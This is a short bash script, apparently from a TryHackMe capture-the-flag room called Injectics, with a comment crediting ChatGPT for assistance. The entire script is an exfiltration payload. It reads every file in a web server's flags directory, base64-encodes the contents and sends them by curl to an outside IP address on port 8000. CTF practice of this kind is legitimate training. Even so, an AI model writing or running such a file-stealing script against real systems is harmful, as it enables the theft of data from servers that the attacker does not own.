#!/bin/bash
# List the contents of the /flag directory
# tryhackme room Injectics / assistance by ChatGPT
flag_dir="/var/www/html/flags"
flag_contents=$(ls $flag_dir)

# Prepare the data to be sent
data=""

for file in $flag_contents; do
    file_path="$flag_dir/$file"
    if [[ -f $file_path ]]; then
        file_content=$(cat $file_path)
        data="$data$file: $file_content\n"
    fi
done

# URL encode the data
encoded_data=$(echo -e "$data" | base64 -w 0)
# Send the contents back to your server using a GET request
curl "http://10.9.199.179:8000/receive_flag_contents?data=$encoded_data"
